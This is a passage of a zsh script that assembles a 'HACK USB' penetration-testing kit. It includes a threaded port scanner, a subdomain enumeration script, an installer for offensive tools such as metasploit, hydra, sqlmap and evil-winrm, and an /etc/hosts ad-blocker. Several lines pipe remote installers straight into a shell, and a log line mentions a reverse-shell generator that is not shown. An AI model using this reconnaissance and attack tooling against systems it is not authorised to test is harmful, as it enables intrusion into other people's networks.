        s=socket.socket(); s.settimeout(0.5); s.connect((host,port)); s.close()
        try: svc=socket.getservbyport(port)
        except: svc="unknown"
        return (port,svc)
    except: return None
def scan(host,start=1,end=65535):
    print(f"\n  Scanning {host}:{start}-{end}\n"); open_ports=[]; t=time.time()
    with concurrent.futures.ThreadPoolExecutor(max_workers=500) as ex:
        futs={ex.submit(scan_port,host,p):p for p in range(start,end+1)}
        for f in concurrent.futures.as_completed(futs):
            r=f.result()
            if r: open_ports.append(r); print(f"  ✓  {r[0]:5d}/tcp  {r[1]}")
    open_ports.sort(); print(f"\n  {len(open_ports)} open ports  ({time.time()-t:.1f}s)\n")
if __name__=="__main__":
    if len(sys.argv)<2: print(__doc__); sys.exit(1)
    rng=sys.argv[2].split("-") if len(sys.argv)>2 else ["1","1024"]
    scan(sys.argv[1],int(rng[0]),int(rng[1]) if len(rng)>1 else int(rng[0]))
EOF

  # ── subdomain_enum.zsh ────────────────────────────────────
  cat > "$sd/subdomain_enum.zsh" << 'EOF'
#!/usr/bin/env zsh
# subdomain_enum.zsh | Needs: subfinder, dnsx, httpx, assetfinder, amass
# Usage: zsh subdomain_enum.zsh <DOMAIN>
DOMAIN="${1:?Usage: zsh subdomain_enum.zsh <DOMAIN>}"
OUT="${0:A:h:h}/11_reports/subs_${DOMAIN}_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$OUT"
echo "\n  Subdomain enumeration: $DOMAIN\n"
TMP="$OUT/all_raw.txt"
[[ -f "$TMP" ]] && rm "$TMP"; touch "$TMP"
command -v subfinder    &>/dev/null && subfinder -d "$DOMAIN" -silent -o "$OUT/subfinder.txt"    2>/dev/null && cat "$OUT/subfinder.txt"    >> "$TMP" && echo "  ✓ subfinder:    $(wc -l < $OUT/subfinder.txt | tr -d ' ')"
command -v assetfinder  &>/dev/null && assetfinder --subs-only "$DOMAIN" > "$OUT/assetfinder.txt" 2>/dev/null && cat "$OUT/assetfinder.txt" >> "$TMP" && echo "  ✓ assetfinder:  $(wc -l < $OUT/assetfinder.txt | tr -d ' ')"
command -v amass        &>/dev/null && amass enum -passive -d "$DOMAIN" -o "$OUT/amass.txt"       2>/dev/null && cat "$OUT/amass.txt"        >> "$TMP" && echo "  ✓ amass:        $(wc -l < $OUT/amass.txt | tr -d ' ')"
sort -u "$TMP" > "$OUT/all_unique.txt"
echo "\n  Total unique: $(wc -l < $OUT/all_unique.txt | tr -d ' ')"
command -v dnsx         &>/dev/null && dnsx -l "$OUT/all_unique.txt" -silent -o "$OUT/resolved.txt" 2>/dev/null && echo "  ✓ resolved:     $(wc -l < $OUT/resolved.txt | tr -d ' ')"
command -v httpx        &>/dev/null && [[ -f "$OUT/resolved.txt" ]] && httpx -l "$OUT/resolved.txt" -silent -o "$OUT/live_web.txt" 2>/dev/null && echo "  ✓ live web:     $(wc -l < $OUT/live_web.txt | tr -d ' ')"
echo "\n  ✓ Results: $OUT\n"
EOF

  # ── install_on_pc.zsh ─────────────────────────────────────
  # NEW: standalone script that installs all tools on a PC (no USB needed)
  cat > "$sd/install_on_pc.zsh" << 'INSTALLSCRIPT'
#!/usr/bin/env zsh
# ╔══════════════════════════════════════════════════════════════════╗
# ║   HACK USB — Install Tools on PC                               ║
# ║   Installs all pentest tools directly on your machine          ║
# ║                                                                 ║
# ║   macOS:   zsh install_on_pc.zsh   (no sudo)                  ║
# ║   Linux:   sudo zsh install_on_pc.zsh                          ║
# ║                                                                 ║
# ║   ⚠  USE ON YOUR OWN / AUTHORIZED SYSTEMS ONLY!               ║
# ╚══════════════════════════════════════════════════════════════════╝

BOLD='\033[1m'; RED='\033[0;31m'; GREEN='\033[0;32m'
YELLOW='\033[1;33m'; CYAN='\033[0;36m'; DIM='\033[2m'
MAGENTA='\033[0;35m'; NC='\033[0m'
LOG="/tmp/hackusb_pc_install.log"

ok()    { echo -e "${GREEN}  ✓${NC}  $1" | tee -a "$LOG"; }
info()  { echo -e "${CYAN}  →${NC}  $1" | tee -a "$LOG"; }
warn()  { echo -e "${YELLOW}  !${NC}  $1" | tee -a "$LOG"; }
err()   { echo -e "${RED}  ✗${NC}  $1" | tee -a "$LOG"; }
step()  { echo -e "\n${MAGENTA}${BOLD}  ▶ $1${NC}\n" | tee -a "$LOG"; }
section(){ echo -e "\n${CYAN}${BOLD}  ══════════════════════════════════\n  $1\n  ══════════════════════════════════${NC}\n"; }
ask()   { print -n "  ${CYAN}?${NC}  $1 " && read REPLY; }

# Detect real user
if [[ -n "${SUDO_USER:-}" && "$SUDO_USER" != "root" ]]; then
  REAL_USER="$SUDO_USER"; REAL_HOME=$(eval echo "~$SUDO_USER")
else
  REAL_USER="${USER:-$(whoami)}"; REAL_HOME="$HOME"
fi
case "$(basename ${SHELL:-zsh})" in
  zsh)  SHELL_RC="$REAL_HOME/.zshrc" ;;
  bash) SHELL_RC="$REAL_HOME/.bashrc" ;;
  *)    SHELL_RC="$REAL_HOME/.profile" ;;
esac
[[ -f "$SHELL_RC" ]] || touch "$SHELL_RC" 2>/dev/null || true

run_as_user() {
  if [[ "$REAL_USER" != "root" ]] && [[ "$(id -u)" -eq 0 ]]; then
    sudo -u "$REAL_USER" env HOME="$REAL_HOME" "$@" 2>/dev/null || eval "$@"
  else
    eval "$@"
  fi
}

clear
echo -e "${RED}${BOLD}"
echo "  ██╗  ██╗ █████╗  ██████╗██╗  ██╗    ██╗   ██╗███████╗██████╗ "
echo "  ██║  ██║██╔══██╗██╔════╝██║ ██╔╝    ██║   ██║██╔════╝██╔══██╗"
echo "  ███████║███████║██║     █████╔╝     ██║   ██║███████╗██████╔╝ "
echo "  ██╔══██║██╔══██║██║     ██╔═██╗     ██║   ██║╚════██║██╔══██╗ "
echo "  ██║  ██║██║  ██║╚██████╗██║  ██╗    ╚██████╔╝███████║██████╔╝ "
echo "  ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝    ╚═════╝ ╚══════╝╚═════╝  "
echo -e "${NC}"
echo -e "  ${DIM}PC Tool Installer — hackusb${NC}"
echo -e "  ${YELLOW}${BOLD}⚠  USE ON YOUR OWN / AUTHORIZED SYSTEMS ONLY!${NC}"
echo -e "  ${DIM}User: ${CYAN}$REAL_USER${NC}  |  Log: ${CYAN}$LOG${NC}"
echo ""

# OS detection
OS=""
PKG=""
u=$(uname -s 2>/dev/null || echo "Unknown")
case "$u" in
  Darwin*)
    OS="macos"; PKG="brew"
    ok "macOS $(sw_vers -productVersion 2>/dev/null)"
    for p in /opt/homebrew /usr/local; do
      [[ -f "$p/bin/brew" ]] && eval "$($p/bin/brew shellenv)" 2>/dev/null && break
    done
    if ! command -v brew &>/dev/null; then
      warn "Homebrew missing — installing..."
      run_as_user '/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"' >> "$LOG" 2>&1
      for p in /opt/homebrew /usr/local; do
        [[ -f "$p/bin/brew" ]] && eval "$($p/bin/brew shellenv)" 2>/dev/null && break
      done
    fi ;;
  Linux*)
    if grep -qi microsoft /proc/version 2>/dev/null; then OS="wsl"; else OS="linux"; fi
    command -v apt-get &>/dev/null && PKG="apt" || \
    command -v pacman  &>/dev/null && PKG="pacman" || \
    command -v dnf     &>/dev/null && PKG="dnf" || PKG="unknown"
    ok "${OS} / $PKG" ;;
  MINGW*|MSYS*)
    OS="windows"; PKG="winget"
    command -v winget &>/dev/null || PKG="choco"
    ok "Windows ($PKG)" ;;
esac

section "CHOOSE INSTALL PROFILE"
echo -e "  ${GREEN}[1]${NC}  Quick     — core tools only (nmap, python, go, node, git)"
echo -e "  ${YELLOW}[2]${NC}  Standard  — + pentest suite (hydra, john, sqlmap, metasploit, ...)"
echo -e "  ${RED}[3]${NC}  Full      — everything including wireless, forensics, phishing"
echo ""
ask "Profile [1/2/3, Enter=2]:"
PROFILE="${REPLY:-2}"

section "STEP 1 — SYSTEM PACKAGES"
case "$OS" in
  macos)
    _brew() { run_as_user "brew $*"; }
    _brew update --quiet >> "$LOG" 2>&1 || true
    QUICK_PKGS=(git curl wget jq zsh openssl@3 python3 go node ruby tmux fzf bat ripgrep)
    STD_PKGS=(nmap netcat hydra masscan sqlmap nikto gobuster ffuf hashcat john-jumbo
              binwalk exiftool steghide libpcap aircrack-ng)
    FULL_PKGS=(metasploit hcxtools hcxdumptool wireshark foremost tcpdump)
    ALL_PKGS=("${QUICK_PKGS[@]}")
    [[ "$PROFILE" -ge 2 ]] && ALL_PKGS+=("${STD_PKGS[@]}")
    [[ "$PROFILE" -ge 3 ]] && ALL_PKGS+=("${FULL_PKGS[@]}")
    i=0; total=${#ALL_PKGS[@]}
    for pkg in "${ALL_PKGS[@]}"; do
      i=$((i+1))
      run_as_user "brew list $pkg" &>/dev/null 2>&1 && ok "[$i/$total] $pkg — already installed" && continue
      info "[$i/$total] brew install $pkg ..."
      run_as_user "brew install $pkg" >> "$LOG" 2>&1 && ok "[$i/$total] $pkg ✓" || warn "[$i/$total] $pkg — failed"
    done ;;
  linux|wsl)
    sudo apt-get update -qq >> "$LOG" 2>&1
    QUICK_PKGS=(git curl wget jq zsh build-essential python3 python3-pip golang-go nodejs npm ruby tmux fzf bat ripgrep)
    STD_PKGS=(nmap ncat hydra masscan sqlmap nikto gobuster ffuf hashcat john aircrack-ng
              binwalk exiftool steghide foremost libpcap-dev tcpdump)
    FULL_PKGS=(metasploit-framework hcxtools hcxdumptool wireshark-common tshark)
    ALL_PKGS=("${QUICK_PKGS[@]}")
    [[ "$PROFILE" -ge 2 ]] && ALL_PKGS+=("${STD_PKGS[@]}")
    [[ "$PROFILE" -ge 3 ]] && ALL_PKGS+=("${FULL_PKGS[@]}")
    for pkg in "${ALL_PKGS[@]}"; do
      sudo apt-get install -y -qq "$pkg" >> "$LOG" 2>&1 && ok "$pkg ✓" || warn "$pkg — unavailable"
    done ;;
  windows)
    case "$PKG" in
      winget)
        BASE=("Git.Git" "Python.Python.3.12" "Golang.Go" "OpenJS.NodeJS.LTS" "Nmap.Nmap")
        STD=("VeraCrypt.VeraCrypt" "Microsoft.WindowsTerminal")
        for pkg in "${BASE[@]}" $([[ "$PROFILE" -ge 2 ]] && echo "${STD[@]}"); do
          winget install --id "$pkg" --accept-source-agreements --accept-package-agreements >> "$LOG" 2>&1 && ok "$pkg ✓" || warn "$pkg — failed"
        done ;;
      choco)
        choco install -y git python3 golang nodejs nmap wireshark ruby >> "$LOG" 2>&1 ;;
    esac ;;
esac

section "STEP 2 — NODE.JS & NPM TOOLS"
if ! command -v node &>/dev/null || [[ $(node -v 2>/dev/null | tr -d 'v' | cut -d. -f1) -lt 18 ]]; then
  case "$OS" in
    macos)
      run_as_user 'export NVM_DIR="$HOME/.nvm"; curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.7/install.sh | bash' >> "$LOG" 2>&1
      export NVM_DIR="$REAL_HOME/.nvm"; [[ -s "$NVM_DIR/nvm.sh" ]] && source "$NVM_DIR/nvm.sh"
      run_as_user "export NVM_DIR=\"$NVM_DIR\"; source \"$NVM_DIR/nvm.sh\"; nvm install 20 && nvm alias default 20" >> "$LOG" 2>&1 ;;
    linux|wsl)
      curl -fsSL https://deb.nodesource.com/setup_20.x | sudo bash - >> "$LOG" 2>&1
      sudo apt-get install -y -qq nodejs >> "$LOG" 2>&1 ;;
  esac
fi
command -v node &>/dev/null && ok "Node.js $(node --version)" || warn "Node.js not installed"
if command -v npm &>/dev/null; then
  npm config set prefix "$REAL_HOME/.npm-global" 2>/dev/null || true
  export PATH="$REAL_HOME/.npm-global/bin:$PATH"
  grep -q "npm-global" "$SHELL_RC" 2>/dev/null || echo 'export PATH="$HOME/.npm-global/bin:$PATH"' >> "$SHELL_RC"
  npm install -g retire wappalyzer-cli snyk --silent >> "$LOG" 2>&1 && ok "npm tools ✓"
fi

section "STEP 3 — RUST + CARGO TOOLS"
if [[ "$PROFILE" -ge 2 ]]; then
  if ! command -v cargo &>/dev/null; then
    info "Installing Rust..."
    curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y --no-modify-path >> "$LOG" 2>&1 || true
    export PATH="$REAL_HOME/.cargo/bin:$PATH"
    grep -q "cargo/bin" "$SHELL_RC" 2>/dev/null || echo 'export PATH="$HOME/.cargo/bin:$PATH"' >> "$SHELL_RC"
  fi
  command -v cargo &>/dev/null && {
    ok "Rust $(rustc --version 2>&1 | cut -d' ' -f2)"
    for t in feroxbuster rustscan; do
      command -v "$t" &>/dev/null && ok "cargo: $t — exists" || \
      { info "cargo install $t ..."; cargo install "$t" >> "$LOG" 2>&1 && ok "$t ✓" || warn "$t — failed"; }
    done
  }
fi

section "STEP 4 — GO TOOLS"
if command -v go &>/dev/null; then
  export GOPATH="${GOPATH:-$REAL_HOME/go}"; export PATH="$GOPATH/bin:$PATH"
  grep -q "go/bin" "$SHELL_RC" 2>/dev/null || echo 'export GOPATH="$HOME/go"; export PATH="$GOPATH/bin:$PATH"' >> "$SHELL_RC"
  ok "Go $(go version | cut -d' ' -f3)"
  QUICK_GO=("github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest"
             "github.com/projectdiscovery/httpx/cmd/httpx@latest"
             "github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest"
             "github.com/ffuf/ffuf/v2@latest")
  STD_GO=("github.com/projectdiscovery/naabu/v2/cmd/naabu@latest"
           "github.com/projectdiscovery/dnsx/cmd/dnsx@latest"
           "github.com/projectdiscovery/katana/cmd/katana@latest"
           "github.com/tomnomnom/waybackurls@latest"
           "github.com/tomnomnom/assetfinder@latest"
           "github.com/tomnomnom/gf@latest"
           "github.com/tomnomnom/anew@latest"
           "github.com/lc/gau/v2/cmd/gau@latest")
  FULL_GO=("github.com/owasp-amass/amass/v4/...@master"
            "github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest"
            "github.com/hakluke/hakrawler@latest")
  GO_TOOLS=("${QUICK_GO[@]}")
  [[ "$PROFILE" -ge 2 ]] && GO_TOOLS+=("${STD_GO[@]}")
  [[ "$PROFILE" -ge 3 ]] && GO_TOOLS+=("${FULL_GO[@]}")
  i=0; total=${#GO_TOOLS[@]}
  for pkg in "${GO_TOOLS[@]}"; do
    i=$((i+1)); name="${pkg##*/}"; name="${name%%@*}"
    command -v "$name" &>/dev/null && ok "[$i/$total] $name — exists" || \
    { info "[$i/$total] go install $name ..."; go install "$pkg" >> "$LOG" 2>&1 && ok "[$i/$total] $name ✓" || warn "[$i/$total] $name — failed"; }
  done
fi

section "STEP 5 — PYTHON PIP TOOLS"
if command -v pip3 &>/dev/null; then
  ok "Python $(python3 --version 2>&1 | cut -d' ' -f2)"
  _pip(){ pip3 install --quiet --break-system-packages "$1" >> "$LOG" 2>&1 || pip3 install --quiet "$1" >> "$LOG" 2>&1; }
  QUICK_PIP=(requests beautifulsoup4 dnspython rich colorama)
  STD_PIP=(impacket certipy-ad pwntools scapy shodan paramiko httpx mitmproxy)
  FULL_PIP=(bloodhound volatility3 pyOpenSSL cryptography theHarvester)
  PIP_PKGS=("${QUICK_PIP[@]}")
  [[ "$PROFILE" -ge 2 ]] && PIP_PKGS+=("${STD_PIP[@]}")
  [[ "$PROFILE" -ge 3 ]] && PIP_PKGS+=("${FULL_PIP[@]}")
  i=0; total=${#PIP_PKGS[@]}
  for pkg in "${PIP_PKGS[@]}"; do
    i=$((i+1)); info "[$i/$total] pip install $pkg ..."; _pip "$pkg" && ok "[$i/$total] $pkg ✓" || warn "[$i/$total] $pkg — failed"
  done
fi

section "STEP 6 — RUBY GEMS"
if command -v gem &>/dev/null && [[ "$PROFILE" -ge 2 ]]; then
  ok "Ruby $(ruby --version 2>&1 | cut -d' ' -f2)"
  for gem in wpscan evil-winrm; do
    gem list | grep -q "^$gem " && ok "gem: $gem — exists" || \
    { info "gem install $gem ..."; gem install "$gem" --no-document >> "$LOG" 2>&1 && ok "gem: $gem ✓" || warn "gem: $gem — failed"; }
  done
fi

# PATH finalize
echo ""
! grep -q "npm-global" "$SHELL_RC" 2>/dev/null && command -v npm &>/dev/null && echo 'export PATH="$HOME/.npm-global/bin:$PATH"' >> "$SHELL_RC"
! grep -q "cargo/bin"  "$SHELL_RC" 2>/dev/null && [[ -d "$REAL_HOME/.cargo/bin" ]] && echo 'export PATH="$HOME/.cargo/bin:$PATH"' >> "$SHELL_RC"
! grep -q "go/bin"     "$SHELL_RC" 2>/dev/null && command -v go &>/dev/null && { echo 'export GOPATH="$HOME/go"'; echo 'export PATH="$GOPATH/bin:$PATH"'; } >> "$SHELL_RC"

echo ""
echo -e "${GREEN}${BOLD}  ╔══════════════════════════════════════════╗"
echo -e "  ║   ✓  PC INSTALL COMPLETE!               ║"
echo -e "  ╚══════════════════════════════════════════╝${NC}"
echo ""
echo -e "  ${CYAN}Installed runtimes:${NC}"
command -v python3 &>/dev/null && echo -e "  ${GREEN}✓${NC}  Python   $(python3 --version 2>&1 | cut -d' ' -f2)"
command -v node    &>/dev/null && echo -e "  ${GREEN}✓${NC}  Node.js  $(node --version)"
command -v go      &>/dev/null && echo -e "  ${GREEN}✓${NC}  Go       $(go version | cut -d' ' -f3)"
command -v ruby    &>/dev/null && echo -e "  ${GREEN}✓${NC}  Ruby     $(ruby --version 2>&1 | cut -d' ' -f2)"
command -v rustc   &>/dev/null && echo -e "  ${GREEN}✓${NC}  Rust     $(rustc --version 2>&1 | cut -d' ' -f2)"
command -v git     &>/dev/null && echo -e "  ${GREEN}✓${NC}  git      $(git --version 2>&1 | cut -d' ' -f3)"
command -v nmap    &>/dev/null && echo -e "  ${GREEN}✓${NC}  nmap     $(nmap --version 2>&1 | head -1 | cut -d' ' -f3)"
echo ""
echo -e "  ${DIM}Activate PATH: source $SHELL_RC${NC}"
echo -e "  ${DIM}Log: $LOG${NC}"
echo ""
echo -e "  ${RED}⚠  Use only on your own / authorized systems!${NC}"
echo ""
INSTALLSCRIPT

  chmod +x "$sd/"*.zsh "$sd/"*.py 2>/dev/null || true
  log_ok "Scripts: auto_recon.zsh · hashcrack.py · revshell_gen.py (12 variants)"
  log_ok "         livehosts.py · port_scan.py · subdomain_enum.zsh"
  log_ok "         install_on_pc.zsh (standalone PC installer)"
}

# ╔══════════════════════════════════════════════════════════╗
# ║  STEP 11 — AD-BLOCKER                                   ║
# ╚══════════════════════════════════════════════════════════╝
setup_adblocker() {
  [[ $ENABLE_ADBLOCKER -eq 0 ]] && return
  section "STEP 11 — AD-BLOCKER"
  local ab="$USB_ROOT/13_adblocker"
  local lists="$ab/hosts_lists"
  mkdir -p "$lists" "$ab/pihole"

  # ── Download helper: try primary URL, fallback to secondary, retry 3x ──
  _dl_list() {
    local fname="$1" url_primary="$2" url_fallback="${3:-}"
    local out="$lists/$fname" ok=0
    for attempt in 1 2 3; do
      log_info "[$attempt/3] Downloading $fname ..."
      curl -fsSL --max-time 120 --retry 2 -o "$out" "$url_primary" 2>/dev/null && ok=1 && break
      log_warn "Primary failed — waiting 3s..."
      sleep 3
    done
    if [[ $ok -eq 0 && -n "$url_fallback" ]]; then
      log_info "Trying fallback URL for $fname ..."
      curl -fsSL --max-time 120 --retry 2 -o "$out" "$url_fallback" 2>/dev/null && ok=1
    fi
    if [[ $ok -eq 0 ]]; then
      log_warn "$fname — download failed, creating placeholder"
      printf '# HACKUSB placeholder — run hackusb_update.zsh to fetch\n' > "$out"
      return 1
    fi
    local cnt; cnt=$(grep -c "^0\.0\.0\.0" "$out" 2>/dev/null || echo 0)
    if (( cnt > 1000 )); then
      log_ok "$fname — ${cnt} domains ✓"
    else
      log_warn "$fname — only ${cnt} entries (may be truncated)"
    fi
  }

  # ── Hagezi lists (primary + fallback via CDN) ──────────────────────────
  _dl_list "hosts_hagezi_light.txt" \
    "https://raw.githubusercontent.com/hagezi/dns-blocklists/main/hosts/light.txt" \
    "https://cdn.jsdelivr.net/gh/hagezi/dns-blocklists@main/hosts/light.txt"

  _dl_list "hosts_hagezi_pro.txt" \
    "https://raw.githubusercontent.com/hagezi/dns-blocklists/main/hosts/pro.txt" \
    "https://cdn.jsdelivr.net/gh/hagezi/dns-blocklists@main/hosts/pro.txt"

  _dl_list "hosts_hagezi_malware.txt" \
    "https://raw.githubusercontent.com/hagezi/dns-blocklists/main/hosts/threat-intelligence-feeds.txt" \
    "https://cdn.jsdelivr.net/gh/hagezi/dns-blocklists@main/hosts/threat-intelligence-feeds.txt"

  if [[ "$INSTALL_PROFILE" != "minimal" ]]; then
    _dl_list "hosts_hagezi_ultimate.txt" \
      "https://raw.githubusercontent.com/hagezi/dns-blocklists/main/hosts/ultimate.txt" \
      "https://cdn.jsdelivr.net/gh/hagezi/dns-blocklists@main/hosts/ultimate.txt"
  fi

  # ── uBlock Origin / Steven Black DNS lists ─────────────────────────────
  _dl_list "hosts_ublock_ads.txt" \
    "https://raw.githubusercontent.com/uBlockOrigin/uAssets/master/filters/filters.txt" \
    "https://cdn.jsdelivr.net/gh/uBlockOrigin/uAssets@master/filters/filters.txt"

  _dl_list "hosts_steven_black.txt" \
    "https://raw.githubusercontent.com/StevenBlack/hosts/master/hosts" \
    "https://cdn.jsdelivr.net/gh/StevenBlack/hosts@master/hosts"

  _dl_list "hosts_oisd_basic.txt" \
    "https://hosts.oisd.nl/basic/" \
    "https://small.oisd.nl/"

  # ── Build combined list: Hagezi Pro + Malware + Steven Black + oisd ────
  {
    grep "^0\.0\.0\.0" "$lists/hosts_hagezi_pro.txt"     2>/dev/null
    grep "^0\.0\.0\.0" "$lists/hosts_hagezi_malware.txt" 2>/dev/null
    grep "^0\.0\.0\.0" "$lists/hosts_steven_black.txt"   2>/dev/null
    grep "^0\.0\.0\.0" "$lists/hosts_oisd_basic.txt"     2>/dev/null
  } | sort -u > "$ab/hosts_combined.txt" 2>/dev/null
  local combined; combined=$(wc -l < "$ab/hosts_combined.txt" | tr -d ' ')
  log_ok "hosts_combined.txt — ${combined} domains total"

  # ── Write setup_adblocker.zsh ──────────────────────────────────────────
  cat > "$ab/setup_adblocker.zsh" << 'ADSCRIPT'
#!/usr/bin/env zsh
# setup_adblocker.zsh — Ad-Blocker via /etc/hosts
# Needs: zsh, awk, curl, sudo
# Usage: sudo zsh setup_adblocker.zsh [--status|--restore|--update]
# Sources: Hagezi Pro/Malware + Steven Black + oisd basic

SCRIPT_DIR="${0:A:h}"
HOSTS="/etc/hosts"
MARKER_START="# ====== HACKUSB_ADBLOCKER_START ======"
MARKER_END="# ====== HACKUSB_ADBLOCKER_END ======"
BACKUP="/etc/hosts.hackusb_backup"
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; DIM='\033[2m'; BOLD='\033[1m'; NC='\033[0m'
ok()  { echo -e "${GREEN}  ✓${NC}  $1"; }
info(){ echo -e "${CYAN}  →${NC}  $1"; }
warn(){ echo -e "${YELLOW}  !${NC}  $1"; }
err() { echo -e "${RED}  ✗${NC}  $1"; }

[[ "$(id -u)" -ne 0 ]] && { err "Root required:  sudo zsh $0 $*"; exit 1; }

# ── DNS cache flush (macOS + Linux) ───────────────────────────────────────
flush_dns() {
  if command -v dscacheutil &>/dev/null; then
    dscacheutil -flushcache 2>/dev/null
    killall -HUP mDNSResponder 2>/dev/null || true
    ok "DNS cache flushed (macOS)"; return
  fi
  if command -v resolvectl &>/dev/null; then
    resolvectl flush-caches 2>/dev/null && ok "DNS cache flushed (systemd-resolved)"; return
  fi
  if command -v nscd &>/dev/null; then
    nscd -i hosts 2>/dev/null && ok "DNS cache flushed (nscd)"; return
  fi
  info "DNS: open a new terminal to pick up changes"
}

# ── Remove any existing HACKUSB block from /etc/hosts ─────────────────────
remove_entries() {
  local tmp
  tmp=$(mktemp) || { err "mktemp failed"; return 1; }
  awk -v s="$MARKER_START" -v e="$MARKER_END" \
    'BEGIN{skip=0} $0==s{skip=1;next} $0==e{skip=0;next} !skip{print}' \
    "$HOSTS" > "$tmp" 2>/dev/null || { err "awk failed"; rm -f "$tmp"; return 1; }
  cp "$tmp" "$HOSTS" 2>/dev/null || { err "Cannot write /etc/hosts (read-only?)"; rm -f "$tmp"; return 1; }
  rm -f "$tmp"
}

# ── Download a single blocklist with retry + fallback ─────────────────────
_fetch() {
  local dest="$1" url_a="$2" url_b="${3:-}"
  local dl_ok=0
  for try in 1 2 3; do
    curl -fsSL --max-time 120 --retry 2 -o "$dest" "$url_a" 2>/dev/null && dl_ok=1 && break
    info "Attempt $try failed — retrying in 3s..."
    sleep 3
  done
  if [[ $dl_ok -eq 0 && -n "$url_b" ]]; then
    info "Trying fallback URL..."
    curl -fsSL --max-time 120 --retry 2 -o "$dest" "$url_b" 2>/dev/null && dl_ok=1
  fi
  return $(( 1 - dl_ok ))
}

# ── --update: re-download all lists ──────────────────────────────────────
_update_lists() {
  info "Updating blocklists..."
  local LD="$SCRIPT_DIR/hosts_lists"
  mkdir -p "$LD"
  _fetch "$LD/hosts_hagezi_light.txt" \
    "https://raw.githubusercontent.com/hagezi/dns-blocklists/main/hosts/light.txt" \
    "https://cdn.jsdelivr.net/gh/hagezi/dns-blocklists@main/hosts/light.txt" \
    && ok "hagezi light ✓" || warn "hagezi light — failed"
  _fetch "$LD/hosts_hagezi_pro.txt" \
    "https://raw.githubusercontent.com/hagezi/dns-blocklists/main/hosts/pro.txt" \
    "https://cdn.jsdelivr.net/gh/hagezi/dns-blocklists@main/hosts/pro.txt" \
    && ok "hagezi pro ✓" || warn "hagezi pro — failed"
  _fetch "$LD/hosts_hagezi_malware.txt" \
    "https://raw.githubusercontent.com/hagezi/dns-blocklists/main/hosts/threat-intelligence-feeds.txt" \
    "https://cdn.jsdelivr.net/gh/hagezi/dns-blocklists@main/hosts/threat-intelligence-feeds.txt" \
    && ok "hagezi malware ✓" || warn "hagezi malware — failed"
  _fetch "$LD/hosts_hagezi_ultimate.txt" \
    "https://raw.githubusercontent.com/hagezi/dns-blocklists/main/hosts/ultimate.txt" \
    "https://cdn.jsdelivr.net/gh/hagezi/dns-blocklists@main/hosts/ultimate.txt" \
    && ok "hagezi ultimate ✓" || warn "hagezi ultimate — failed"
  _fetch "$LD/hosts_steven_black.txt" \
    "https://raw.githubusercontent.com/StevenBlack/hosts/master/hosts" \
    "https://cdn.jsdelivr.net/gh/StevenBlack/hosts@master/hosts" \
    && ok "steven black ✓" || warn "steven black — failed"
  _fetch "$LD/hosts_oisd_basic.txt" \
    "https://hosts.oisd.nl/basic/" \
    "https://small.oisd.nl/" \
    && ok "oisd basic ✓" || warn "oisd — failed"
  # Rebuild combined
  {
    grep "^0\.0\.0\.0" "$LD/hosts_hagezi_pro.txt"     2>/dev/null
    grep "^0\.0\.0\.0" "$LD/hosts_hagezi_malware.txt" 2>/dev/null
    grep "^0\.0\.0\.0" "$LD/hosts_steven_black.txt"   2>/dev/null
    grep "^0\.0\.0\.0" "$LD/hosts_oisd_basic.txt"     2>/dev/null
  } | sort -u > "$SCRIPT_DIR/hosts_combined.txt"
  ok "hosts_combined.txt rebuilt — $(wc -l < $SCRIPT_DIR/hosts_combined.txt | tr -d ' ') domains"
}

# ── Handle subcommands ────────────────────────────────────────────────────
CMD="${1:-install}"
case "$CMD" in
  --status|status)
    echo ""
    if grep -qF "$MARKER_START" "$HOSTS" 2>/dev/null; then
      CNT=$(grep -c "^0\.0\.0\.0" "$HOSTS" 2>/dev/null || echo 0)
      ok "ACTIVE — ${CNT} domains blocked"
      echo -e "  ${DIM}Remove: sudo zsh $0 --restore${NC}"
    else
      warn "NOT ACTIVE"
    fi
    echo ""; exit 0 ;;

  --restore|restore)
    if [[ -f "$BACKUP" ]]; then
      cp "$BACKUP" "$HOSTS" && flush_dns && ok "Restored from $BACKUP"
    else
      remove_entries && flush_dns && ok "Ad-blocker entries removed"
    fi
    echo ""; exit 0 ;;

  --update|update)
    _update_lists; echo ""; exit 0 ;;

  install|*)
    echo ""; echo -e "  ${CYAN}${BOLD}HACK USB — AD-BLOCKER${NC}"; echo ""
    echo -e "  ${DIM}Sources: Hagezi · Steven Black · oisd · uBlock Origin${NC}"; echo "" ;;
esac

# ── Profile selection ──────────────────────────────────────────────────────
LISTS_DIR="$SCRIPT_DIR/hosts_lists"
echo -e "  ${GREEN}[1]${NC}  Light     ~50K    Hagezi light — minimal, few false positives"
echo -e "  ${YELLOW}[2]${NC}  Pro       ~100K   Hagezi pro — recommended"
echo -e "  ${RED}[3]${NC}  Ultimate  ~250K   Hagezi ultimate — aggressive"
echo -e "  ${CYAN}[4]${NC}  Combo     ~200K+  Hagezi Pro + Malware + Steven Black + oisd"
echo -e "  ${DIM}[5]${NC}  Steven Black only — ~100K (ads + malware)"
echo ""
print -n "  ${CYAN}?${NC}  Profile [1/2/3/4/5, Enter=4]: "
read CHOICE
case "${CHOICE:-4}" in
  1) BL="$LISTS_DIR/hosts_hagezi_light.txt";    PN="Light" ;;
  2) BL="$LISTS_DIR/hosts_hagezi_pro.txt";      PN="Pro" ;;
  3) BL="$LISTS_DIR/hosts_hagezi_ultimate.txt"; PN="Ultimate" ;;
  5) BL="$LISTS_DIR/hosts_steven_black.txt";    PN="Steven Black" ;;
  *) BL="$SCRIPT_DIR/hosts_combined.txt";       PN="Combo (Hagezi+StevenBlack+oisd)" ;;
esac

# ── Validate list ──────────────────────────────────────────────────────────
if [[ ! -f "$BL" ]] || (( $(grep -c "^0\.0\.0\.0" "$BL" 2>/dev/null || echo 0) < 100 )); then
  warn "Blocklist missing or too small: $BL"
  info "Downloading now..."
  _update_lists
  # Re-check after update
  [[ ! -f "$BL" ]] && { err "Still missing after update — aborting"; exit 1; }
fi

CNT=$(grep -c "^0\.0\.0\.0" "$BL" 2>/dev/null || echo 0)
(( CNT < 100 )) && { err "Blocklist empty (${CNT} lines) — check internet"; exit 1; }
